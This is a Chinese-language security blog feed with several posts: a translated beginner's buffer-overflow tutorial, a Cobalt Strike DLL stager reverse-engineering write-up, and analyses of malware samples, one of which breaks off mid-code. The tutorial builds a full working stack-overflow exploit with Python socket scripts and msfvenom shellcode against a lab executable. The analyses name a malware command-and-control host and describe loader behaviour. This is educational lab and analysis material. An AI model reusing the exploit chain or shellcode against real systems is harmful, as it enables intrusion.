    <content type="html"><![CDATA[<p>原文链接:<a href="https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/" target="_blank" rel="noopener">https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/</a><br>算是翻译文</p><h2 id="什么是缓冲区溢出？"><a href="#什么是缓冲区溢出？" class="headerlink" title="什么是缓冲区溢出？"></a>什么是缓冲区溢出？</h2><p>缓冲区是易失性的内存分配，它们在将数据从一个位置传输到另一位置时临时保存数据。当正在处理的数据超出存储缓冲区的存储容量时，将发生缓冲区溢出。这导致程序覆盖相邻存储器位置中的过大数据，从而导致缓冲区溢出。当我们对char类型的缓冲区进行操作时，将发生缓冲区溢出。</p><p>我们将通过一些示例来尝试理解这个概念。例如，缓冲区的设计方式是接受8个字节的数据，在这种情况下，如果用户输入的数据超过8个字节，则超过8个字节的数据将覆盖相邻的内存，从而超过分配的缓冲区边界。最终将产生分段错误，随后出现许多其他错误，从而导致程序执行被终止。</p><h2 id="缓冲区溢出的类型"><a href="#缓冲区溢出的类型" class="headerlink" title="缓冲区溢出的类型"></a>缓冲区溢出的类型</h2><p>缓冲区溢出有两种类型。让我们讨论两者的简短介绍。</p><p><strong>堆栈缓冲区溢出/Vanilla Buffer缓冲区溢出</strong><br>当程序覆盖缓冲区边界之外的程序的调用堆栈上的内存地址时，就会发生这种情况，缓冲区边界的长度是固定的。在堆栈缓冲区溢出中，多余的数据将被写入位于堆栈上的相邻缓冲区中。由于与堆栈上溢出的相邻内存位置中的内存损坏相关的错误，通常会导致应用程序崩溃。</p><p><strong>堆缓冲区溢出</strong><br>堆是用于管理动态内存分配的内存结构。它通常用于分配在编译时未知大小的内存，因为所需的内存量太大，以致于无法将其装入堆栈中。堆溢出或溢出是堆数据区域中发生的一种缓冲区溢出。基于堆的溢出利用不同于基于堆栈的溢出利用。堆上的内存在运行时动态分配，通常包含程序数据。通过以特定方式破坏此数据以使应用程序覆盖内部结构（如链接列表指针）来完成利用。</p><p><strong>堆栈缓冲区溢出攻击</strong><br>最常见的缓冲区溢出攻击称为基于堆栈的缓冲区溢出攻击或普通缓冲区溢出攻击，通常由一个堆栈构成，直到且除非程序需要用户输入，例如用户名或密码，否则堆栈为空。然后，程序将返回存储器地址写入堆栈，然后将用户的输入存储在堆栈顶部。处理堆栈时，用户的输入将发送到程序指定的返回地址。</p><p><img src="https://z3.ax1x.com/2021/05/07/g3jWi6.png" alt=""></p><p>但是，在开始时会为堆栈分配特定数量的内存，这使其变得有限。如果用户输入的数据大于堆栈中分配的内存量，并且程序没有适当的输入验证，可以验证所提供的数据是否适合分配的内存，则将导致在溢出。<br>如果堆栈缓冲区中填充了不受信任用户提供的数据，则用户可以以将恶意可执行代码注入正在运行的程序并控制进程的方式来破坏堆栈。</p><h2 id="Windows缓冲区溢出攻击"><a href="#Windows缓冲区溢出攻击" class="headerlink" title="Windows缓冲区溢出攻击"></a>Windows缓冲区溢出攻击</h2><p>Buffer Overflow可在包括Linux，Windows和其他各种平台的不同平台上工作，因为它处理内存而不是基于内存的内容。由于要在Linux上处理内存寄存器可能有点困难，因此我们先做出明智的选择，首先了解具有可执行文件的Windows机器上的缓冲区溢出的各个步骤和技术，然后再继续进行操作。</p><p>这里属于堆栈溢出</p><p>在Windows设备上的缓冲区溢出攻击的演示中，我们将使用容易受到缓冲区溢出攻击的公共Windows应用程序。<br>示例exe：<a href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe" target="_blank" rel="noopener">https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe</a><br>调试工具：<a href="https://debugger.immunityinc.com/ID_register.py" target="_blank" rel="noopener">https://debugger.immunityinc.com/ID_register.py</a><br>此exe为32位，没开启ASLR（windows开启ASLR后没法绕）<br><img src="https://z3.ax1x.com/2021/05/07/g3j4zD.png" alt=""></p><p>（原本想使用OD的，但是崩溃的时候OD的ESP没有给出内容）<br>管理员权限运行Immunity Debugger<br>将exe拖入Immunity Debugger，F9运行 （运行dostackbufferoverflowgood.exe会开启31337端口）<br><img src="https://z3.ax1x.com/2021/05/07/g3josH.png" alt=""></p><p>nmap扫描<br><img src="https://z3.ax1x.com/2021/05/07/g3jTLd.png" alt=""></p><p>Fuzz测试崩溃需要的bytes</p><pre><code class="python">import socketstring=b&quot;\x41&quot; * 10ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)while True:    try:        print(&quot;Fuzz with {} bytes&quot;.format(len(string)))        s.sendall(string+b&quot;\x0a\x0d&quot;)        string+=b&quot;\x41&quot; * 10        s.recv(1024)    except:        print(&quot;Fuzzer stop at {} bytes&quot;.format(len(string)))        exit(0)s.close()</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3jOFP.png" alt=""></p><p>在Immunity Debugger中检查进程状态，则可以看到该应用程序现在处于暂停状态。要注意的另一件事是ESP寄存器中的A溢出。这确认了如果我们在其中发送160个A或160字节的数据，应用程序将崩溃。<br><img src="https://z3.ax1x.com/2021/05/07/g3jXJf.png" alt=""></p><p>寄存器介绍：<br>EAX –这是一个累加器寄存器，用于执行算术计算，如加，减，比较和存储函数调用的返回值。<br>ECX –该寄存器的作用类似于用于迭代的计数器，它以递减的方式计数。<br>EDX –该寄存器保存额外的数据，以执行复杂的计算，例如乘法和除法。它充当EAX寄存器的扩展。<br>EBX –它是没有任何定义用途的基址寄存器，可用于存储数据。<br>ESP –它是堆栈指针。它指示当前指令在内存中的位置。它始终指向堆栈的顶部。<br>EBP –它是指向堆栈基础的基础指针。<br>ESI –被称为源索引寄存器，用于保存输入数据的位置。<br>EDI –它是目标索引寄存器，指向存储已处理数据结果的位置。<br>EIP –它是指令指针寄存器。它是一个只读寄存器，其中保存要读取的下一条指令的地址。</p><p><strong>偏移发现和控制EIP</strong><br>EIP偏移量是一个确切的值，它为我们提供了以下信息：多少字节将填充缓冲区并溢出到返回地址（EIP）中。<br>控制EIP是缓冲区溢出攻击的一个非常关键的部分，因为EIP是最终将指向我们的恶意代码以便可以执行的寄存器。在对应用程序进行模糊测试时，我们看到它崩溃了160个字节，这意味着EIP位于1到160个字节之间。因此，我们将在MSF中使用模式创建工具，该工具会生成某些字节的模式，这将引导我们找到确切的偏移值。我们将生成一个200字节的模式。多出40个字节，以进行一些额外的填充。</p><pre><code>msf-pattern_create -l 200</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vpLj.png" alt=""></p><p>重加载程序<br>发送测试</p><pre><code class="python">import socketbuffer=b&quot;&lt;msf-pattern_create生成的buffer&gt;&quot;buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p>该漏洞导致访问冲突错误，程序崩溃。现在，ESP寄存器显示了我们发送给应用程序使其崩溃的模式。现在，如果我们查看EIP寄存器，则值为39654138<br><img src="https://z3.ax1x.com/2021/05/07/g3vPwn.md.png" alt=""></p><p>msf-pattern_offset计算出EIP偏移大小</p><pre><code>msf-pattern_offset -l 200 -q 39654138</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vioq.png" alt=""></p><p>现在我们知道EIP偏移值，我们不再需要发送模式。我们可以简单地发送146个A代替该模式。我们将在146 A之后发送4 B，以确保我们可以控制EIP。如果漏洞利用代码执行后EIP寄存器中有4个B，那么可以确认我们现在可以控制EIP了。<br><img src="https://z3.ax1x.com/2021/05/07/g3vZSU.png" alt=""></p><pre><code>import socketoffset=146eip=b&quot;B&quot; * 4buffer=b&quot;A&quot;*offset+eip #&quot;A&quot;*offset为填充缓冲区，+eip是溢出来的4个字节buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3velF.png" alt=""><br>如上图所示，EIP寄存器为“ 42424242”。ASCII字符“ B”的十六进制值为0x42。因此，在这一点上已确认我们可以控制EIP寄存器。</p><p><strong>寻找坏字节 </strong><br>坏字符是破坏shellcode的不需要的字符。查找和忽略不良字符是必要的，因为不良字符会在出现的任何地方终止字符串执行。如果最后在我们的shellcode中存在任何坏字符，那么它将在该坏字符所在的位置停止执行，因此在生成我们的shellcode时，我们将忽略所有坏字符。</p><p>要查找不良字符，我们首先将使用python脚本生成所有字符，然后将其发送到应用程序以进行崩溃和分析。下面的代码生成从x01到xff的所有字符，而没有x00，因为x00在默认情况下是错误字符。x00被称为空字节。</p><pre><code>for x in range(1,256):    print(&quot;\\x&quot;+&quot;{:02x}&quot;.format(x),end=&quot;&quot;)print(&quot;&quot;)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vQT1.png" alt=""></p><p>修改脚本发送:</p><pre><code class="python">import socketoffset=146eip=b&quot;B&quot; * 4buf=b&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;buffer=b&quot;A&quot;*offset+eip+bufbuffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p>将对ESP的十六进制转储与所有字符进行比较，以查找内存中出现的任何不良字符。为此，我们将选择ESP，然后在转储中选择“跟随”。<br>（字符损坏的十六进制会变成00）</p><p><img src="https://z3.ax1x.com/2021/05/07/g3v8fK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vNOH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vd0A.png" alt=""></p><p>将十六进制转储与发送的所有字符进行比较，我们将看到从01到09一切都很好，但是09之后是21，而不是0A。这意味着”\x0a”是错误字符。<br>检查从01到FF的ESP十六进制转储，可以在上图中看到，我们现在推导出了所有不良字符，这意味着“ \ x00”和“ \ x0a”是唯一出现的不良字符。</p><h2 id="JMP-ESP"><a href="#JMP-ESP" class="headerlink" title="JMP ESP"></a>JMP ESP</h2><p>(寻找调用jmp ESP的地址，可以修改EIP为对应的jmp ESP地址这里可以这么做，原因是这里并没开启ASLR，开启了ASLR需要另外操作)<br>为了找到JMP ESP，我们将使用mona模块。我们需要下载mona.py并将其粘贴到C:\Program Files（x86\Immunity Inc\Immunity Debugger\PyCommands中。<br>发生访问冲突时，ESP寄存器指向包含我们已发送给应用程序的数据的内存。JMP ESP指令用于将代码执行重定向到该位置。要找到JMP ESP，我们需要使用带有–cpb选项的mona模块以及我们之前发现的所有不良字符，这将避免mona返回具有不良字符的内存指针。运行命令后，我们需要打开日志数据。</p><pre><code>!mona jmp -r esp -cpb &quot;\x00\x0a&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3v61S.png" alt=""></p><p>寻找第一个jmp ESP的地址，复制内存地址<br><img src="https://z3.ax1x.com/2021/05/07/g3vf7n.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vIhV.png" alt=""></p><p>如上图所示，我们发现JMP ESP地址为080414C3。在更新脚本之前，我们需要了解字节序的概念。</p><p><strong>字节序</strong><br>计算机有两种存储int和float之类的多字节数据类型的方式，这两种类型称为Little Endian和Big Endian。x86被称为Little Endian体系结构。在这种体系结构中，二进制文件的最后一个字节首先存储。在Big Endian中，情况恰恰相反。二进制文件的第一个字节仅在Big Endian体系结构中首先存储。当我们使用x86体系结构时，应将JMP ESP地址转换为Little Endian格式，即”\xC3\x14\x04\x08”。在使用JMP ESP之后，我们需要对漏洞利用进行一些调整。</p><p>（其实就是大端和小端序列的区别，小端序列内存取反，大端序列内存不变）</p><p><strong>NOP指令</strong><br>NOP是一系列无操作指令，负责将CPU的执行流程滑至下一个内存地址。如果我们在shellcode之前加了nop，那么缓冲区的位置就无关紧要，当返回指针碰到NOP滑板时，顾名思义，它将滑动返回地址，直到到达我们的shellcode的开头。 。<br><img src="https://z3.ax1x.com/2021/05/07/g3v71U.png" alt=""></p><p>不同的CPU的NOP值是不同的。在我们的例子中，我们将使用”\x90”。<br>nop指令对应的字节码是90<br><img src="https://z3.ax1x.com/2021/05/07/g3vX7R.png" alt=""></p><h2 id="生成Shellcode"><a href="#生成Shellcode" class="headerlink" title="生成Shellcode"></a>生成Shellcode</h2><pre><code>msfvenom -p windows/exec cmd=calc.exe -b &quot;\x00\x0a&quot; -f py</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vxtx.png" alt=""></p><p>shellcode发送</p><pre><code class="python">import socketoffset=146buf =  b&quot;&quot;buf += b&quot;\xbd\xb9\xb7\x52\x9e\xdb\xd6\xd9\x74\x24\xf4\x58\x33&quot;buf += b&quot;\xc9\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xe8\x45\x55&quot;buf += b&quot;\xa7\x62\x5d\x18\x48\x9b\x9d\x7d\xc0\x7e\xac\xbd\xb6&quot;buf += b&quot;\x0b\x9e\x0d\xbc\x5e\x12\xe5\x90\x4a\xa1\x8b\x3c\x7c&quot;buf += b&quot;\x02\x21\x1b\xb3\x93\x1a\x5f\xd2\x17\x61\x8c\x34\x26&quot;buf += b&quot;\xaa\xc1\x35\x6f\xd7\x28\x67\x38\x93\x9f\x98\x4d\xe9&quot;buf += b&quot;\x23\x12\x1d\xff\x23\xc7\xd5\xfe\x02\x56\x6e\x59\x85&quot;buf += b&quot;\x58\xa3\xd1\x8c\x42\xa0\xdc\x47\xf8\x12\xaa\x59\x28&quot;buf += b&quot;\x6b\x53\xf5\x15\x44\xa6\x07\x51\x62\x59\x72\xab\x91&quot;buf += b&quot;\xe4\x85\x68\xe8\x32\x03\x6b\x4a\xb0\xb3\x57\x6b\x15&quot;buf += b&quot;\x25\x13\x67\xd2\x21\x7b\x6b\xe5\xe6\xf7\x97\x6e\x09&quot;buf += b&quot;\xd8\x1e\x34\x2e\xfc\x7b\xee\x4f\xa5\x21\x41\x6f\xb5&quot;buf += b&quot;\x8a\x3e\xd5\xbd\x26\x2a\x64\x9c\x2c\xad\xfa\x9a\x02&quot;buf += b&quot;\xad\x04\xa5\x32\xc6\x35\x2e\xdd\x91\xc9\xe5\x9a\x6e&quot;buf += b&quot;\x80\xa4\x8a\xe6\x4d\x3d\x8f\x6a\x6e\xeb\xd3\x92\xed&quot;buf += b&quot;\x1e\xab\x60\xed\x6a\xae\x2d\xa9\x87\xc2\x3e\x5c\xa8&quot;buf += b&quot;\x71\x3e\x75\xcb\x14\xac\x15\x22\xb3\x54\xbf\x3a&quot;jmpaddrfess=b&quot;\xc3\x14\x04\x08&quot;nops = b&quot;\x90&quot; * 16buffer=b&quot;A&quot;*offset+jmpaddrfess+nops+buf #填充缓冲区-&gt;jmp到执行ESP的指令（EIP寄存器控制）-&gt; nop指令填充-&gt;shellcode执行buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3xPje.png" alt=""></p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><p>1.Fuzz造成崩溃的bytes，找到崩溃的寄存器<br>2.崩溃中断后给出的地址复制，计算ESP填充大小<br>3.尝试控制EIP<br>4.寻找错误十六进制坏字节<br>5.shellcode发送执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原文链接:&lt;a href=&quot;https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.hackingart</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike的DLL Stager分析</title>
    <link href="http://422926799.github.io/posts/78291ddc.html"/>
    <id>http://422926799.github.io/posts/78291ddc.html</id>
    <published>2021-04-27T15:40:18.000Z</published>
    <updated>2021-04-27T15:45:35.075Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/" target="_blank" rel="noopener">https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs生成分阶段的dll x64位，丢进IDA分析<br><img src="https://z3.ax1x.com/2021/04/27/gCfujJ.png" alt=""></p><p>DllMain函数:<br>1.CreateThread启动线程调用sub_6BAC16B0函数<br>2.调用sub_6BAC15B2函数<br><img src="https://z3.ax1x.com/2021/04/27/gCfQBR.png" alt=""></p><p>sub_6BAC16B0函数:<br>1.将WInMain函数的dll句柄传入到sub_6BAC1605函数执行<br><img src="https://z3.ax1x.com/2021/04/27/gCflH1.png" alt=""></p><p>sub_6BAC1605函数:<br>1.系统启动以来经过的毫秒数*0x26AA<br>2.拼接获取管道名 -&gt; \.\pipe\MSSE-%d-server （例如：\.\pipe\MSSE-1234-server）。该管道的格式是有据可查的“钴罢工”危害指标<br>3.CreateThread启动线程调用调用StartAddress函数<br><img src="https://z3.ax1x.com/2021/04/27/gCf8N6.png" alt=""></p><p>StartAddress函数:<br>1.调用sub_6BAC1440函数,传入一个指针和nNumberOfBytesToRead变量<br><img src="https://z3.ax1x.com/2021/04/27/gCfG4K.png" alt=""></p><p>sub_6BAC1440函数:<br>1.CreateNamedPipeA创建管道<br>2.ConnectNamedPipe连接管道<br>3.连接成功，WriteFile管道写入shellcode<br>4.CloseHandle关闭句柄（一旦将shellcode写入管道后，先前通过管道打开的句柄就通过闭合CloseHandle。这表明管道的唯一目的是传输加密的Shellcode）<br><img src="https://z3.ax1x.com/2021/04/27/gCfY9O.png" alt=""></p><p>sub_6BAC1512函数:<br>1.读取管道里的shell复制到数组 （一旦管道以只读模式打开，该FillBufferFromPipe函数将继续在shellcode上进行复制，直到使用填充分配的缓冲区ReadFile。缓冲区填满后，将关闭命名管道的句柄CloseHandle并FillBufferFromPipe返回TRUE）<br><img src="https://z3.ax1x.com/2021/04/27/gCft3D.png" alt=""></p><p>sub_6BAC176E函数:<br>1.使用VirtualAlloc更改内存区域权限(MEM_RESERVE|MEM_COMMIT)<br>2.一旦分配了区域，该函数就会在shellcode缓冲区上循环并使用简单的xor操作将每个字节解密到新分配的区域中<br>3.调用sub_6BAC1733函数<br>4.VirtualProtect更改区域页面权限为PAGE_EXECUTE_READ<br>5.CreateThread启动线程调用sub_6BAC1730函数<br><img src="https://z3.ax1x.com/2021/04/27/gCfwDA.png" alt=""></p><p>sub_6BAC1733函数:<br>1.根据判断确定将GetModuleHandleA、GetProcAddress函数地址写入内存（数组）<br><img src="https://z3.ax1x.com/2021/04/27/gCfrUP.png" alt=""></p><p>sub_6BAC1730函数:<br>1.shellcode执行<br><img src="https://z3.ax1x.com/2021/04/27/gCfs4f.png" alt=""></p><p>总结：<br>1.创建管道写shellcode<br>2.从管道读取shellcode复制到数组<br>3.更改内存区域权限(MEM_RESERVE|MEM_COMMIT)，xor解密shellcode，将GetModuleHandleA、GetProcAddress函数地址写入内存，更改区域页面权限为PAGE_EXECUTE_READ<br>4.shellcode执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接:&lt;a href=&quot;https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.nviso.e</summary>
      
    
    
    
    
    <category term="恶意" scheme="http://422926799.github.io/tags/恶意/"/>
    
  </entry>
  
  <entry>
    <title>安全客上某样本分析复现</title>
    <link href="http://422926799.github.io/posts/a9492d23.html"/>
    <id>http://422926799.github.io/posts/a9492d23.html</id>
    <published>2021-04-26T05:23:55.000Z</published>
    <updated>2021-04-26T05:43:54.935Z</updated>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1480848896&auto=1&height=66"></iframe><p>原文链接:<a href="https://www.anquanke.com/post/id/208525#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208525#h2-1</a><br>样本hash：ae986dd436082fb9a7fec397c8b6e717<br>app.any.run地址：<a href="https://app.any.run/tasks/c5066e3d-974b-499a-971f-954dbf2d5c5d/" target="_blank" rel="noopener">https://app.any.run/tasks/c5066e3d-974b-499a-971f-954dbf2d5c5d/</a><br><img src="https://z3.ax1x.com/2021/04/26/gS3ai4.png" alt=""></p><h2 id="动态执行分析"><a href="#动态执行分析" class="headerlink" title="动态执行分析"></a>动态执行分析</h2><p>火绒剑动态分析</p><pre><code>* BA_extract_pe 这个动作表示释放PE文* BA_self_copy 表示自我复制* BA_register_autorun 表示应用程序通过注册表将自己写入了开机自启动</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3dJJ.png" alt=""></p><p>网络行为监测<br><img src="https://z3.ax1x.com/2021/04/26/gS3DQ1.png" alt=""></p><p>general-second.org-help.com<br>GET /dl_ex1.png?m=000C292922B0&amp;NOTE=Ni4yIDogOS45fDV8djEuMAo=<br><img src="https://z3.ax1x.com/2021/04/26/gS36eK.png" alt=""></p><p>微步社区查询</p><pre><code>* 属于Kimsukey组织</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3RFe.png" alt=""></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>pestudio查询</p><pre><code>* PE位数:32-bit</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3fWd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS34SA.png" alt=""></p><p>API恶意行为标记<br><img src="https://z3.ax1x.com/2021/04/26/gS3Iyt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS3oOP.png" alt=""></p><p>strings查询<br><img src="https://z3.ax1x.com/2021/04/26/gS3Hw8.png" alt=""></p><p>IDA打开分析，可以直接找到入口点</p><pre><code>* 创建互斥体    * 互斥体存在退出* 调用sub_4011E0()函数* 调用sub_403600()函数* 调用sub_401580()函数* 调用sub_401770()函数* 调用sub_402790()函数* 判断szServerName长度是否大于0* CreateThread创建线程调用StartAddress函数* 调用WaitForSingleObject等待执行完成</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3OYQ.png" alt=""></p><p>sub_4011E0函数分析<br><img src="https://z3.ax1x.com/2021/04/26/gS89mV.png" alt=""></p><p>可以发现静态分析，没办法分析出什么<br><img src="https://z3.ax1x.com/2021/04/26/gS8CwT.png" alt=""></p><p>打算动态分析，先关闭ASLR<br><img src="https://z3.ax1x.com/2021/04/26/gS8FkF.png" alt=""></p><p>先在sub_401040函数下断，得到解密结果，发现解密出后是wininet.dll<br><img src="https://z3.ax1x.com/2021/04/26/gS8kY4.png" alt=""></p><p>进入call下断可以看的跟直白<br><img src="https://z3.ax1x.com/2021/04/26/gS8AfJ.png" alt=""></p><p>解密得到所有内容<br><img src="https://z3.ax1x.com/2021/04/26/gS8e61.png" alt=""><br>结论是该函数<strong>解密加载对应的dll和获取对应dll的函数地址</strong></p><p>sub_403600函数分析（<strong>拷贝到数据路径，添加开机自启</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS8MTO.png" alt=""></p><p>sub_401580函数分析（<strong>遍历网络适配器得到IP或者使用硬盘序列号生成随机数</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS81te.png" alt=""></p><p>sub_401770函数分析（<strong>获取系统版本、处理器版本、兼容性版本、v1.0然后base64编码返回</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS83fH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8tXt.png" alt=""></p><p>sub_402790函数分析<br><img src="https://z3.ax1x.com/2021/04/26/gS80AS.png" alt=""></p><p>sub_402F30动态跟踪分析<br><img src="https://z3.ax1x.com/2021/04/26/gS8spj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8y1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS86cn.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8W7T.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS85h4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8o9J.png" alt=""><br>拼接随机数，请求dl_ex1.png</p><p>请求成功后进入下一步<br><img src="https://z3.ax1x.com/2021/04/26/gS87cR.png" alt=""></p><p>跟踪sub_401AA0函数<br><img src="https://z3.ax1x.com/2021/04/26/gS8LB6.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8jAO.png" alt=""></p><p>到后面发现是使用rundll32启动执行<br><img src="https://z3.ax1x.com/2021/04/26/gS8vND.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>某cs读取资源文件样本执行分析</title>
    <link href="http://422926799.github.io/posts/a98e0b02.html"/>
    <id>http://422926799.github.io/posts/a98e0b02.html</id>
    <published>2021-04-14T00:27:03.000Z</published>
    <updated>2021-04-14T00:44:35.778Z</updated>
    
    <content type="html"><![CDATA[<p>继续学习样本分析<br>原YouTube视频分析：<a href="https://www.youtube.com/watch?v=deG_-5opR30" target="_blank" rel="noopener">https://www.youtube.com/watch?v=deG_-5opR30</a><br>样本地址：<a href="https://app.any.run/tasks/6cdbb3ea-a272-47d5-b01e-0a41a1ae16f3/" target="_blank" rel="noopener">https://app.any.run/tasks/6cdbb3ea-a272-47d5-b01e-0a41a1ae16f3/</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>下载下来发现是.NET直接丢Dnspy反编译<br><img src="https://z3.ax1x.com/2021/04/14/cy7O9P.png" alt=""></p><p>跟随入口点<br><img src="https://z3.ax1x.com/2021/04/14/cy7vjS.png" alt=""></p><pre><code class="C#">using System;using System.Windows.Forms;namespace WinFormsFirstOne{    // Token: 0x02000013 RID: 19    internal static class Program    {        // Token: 0x06000096 RID: 150 RVA: 0x000068AA File Offset: 0x00004AAA        [STAThread]        private static void Main()        {            Application.EnableVisualStyles();            Application.SetCompatibleTextRenderingDefault(false); //某些控件上定义的属性设置应用程序范围的默认值            Application.Run(new Form1());        }    }}</code></pre><p>跟随第一个函数EnableVisualStyles<br><img src="https://z3.ax1x.com/2021/04/14/cyHSBQ.png" alt=""></p><p>后续跟踪：</p><pre><code class="C#">public static void EnableVisualStyles(){            string text = null;            new FileIOPermission(PermissionState.None) //申请权限            {                AllFiles = FileIOPermissionAccess.PathDiscovery //访问路径本身中的信息。这有助于保护路径中的敏感信息，例如用户名，以及路径中显示的有关目录结构的信息。此值不授予对路径表示的文件或文件夹的访问权限。            }.Assert(); //调用此方法的代码访问受权限需求保护的资源            try            {                text = typeof(Application).Assembly.Location; //读取的资源文件内容            }            finally            {                CodeAccessPermission.RevertAssert();            }            if (text != null)            {                Application.EnableVisualStylesInternal(text, 101);            }}private static void EnableVisualStylesInternal(string assemblyFileName, int nativeResourceID) //EnableVisualStylesInternal函数翻译启用视觉样式内部{            Application.useVisualStyles = UnsafeNativeMethods.ThemingScope.CreateActivationContext(assemblyFileName, nativeResourceID);}////////////////////////public static bool CreateActivationContext(string dllPath, int nativeResourceManifestID) //native Resource Manifest ID(本机资源清单ID){                Type typeFromHandle = typeof(UnsafeNativeMethods.ThemingScope);                bool result;                lock (typeFromHandle)                {                    if (!UnsafeNativeMethods.ThemingScope.contextCreationSucceeded &amp;&amp; OSFeature.Feature.IsPresent(OSFeature.Themes))                    {                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext = default(UnsafeNativeMethods.ThemingScope.ACTCTX);                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.cbSize = 